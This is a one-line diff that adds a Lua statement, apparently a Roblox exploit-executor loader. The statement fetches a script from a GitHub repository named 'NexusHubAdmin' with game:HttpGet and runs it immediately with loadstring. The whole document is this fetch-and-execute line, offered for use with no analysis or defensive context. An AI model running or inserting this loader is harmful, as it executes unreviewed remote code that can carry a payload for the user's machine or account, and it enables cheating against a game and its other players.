@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Miguel918-hub/NexusHubAdmin/refs/heads/main/main.lua"))()
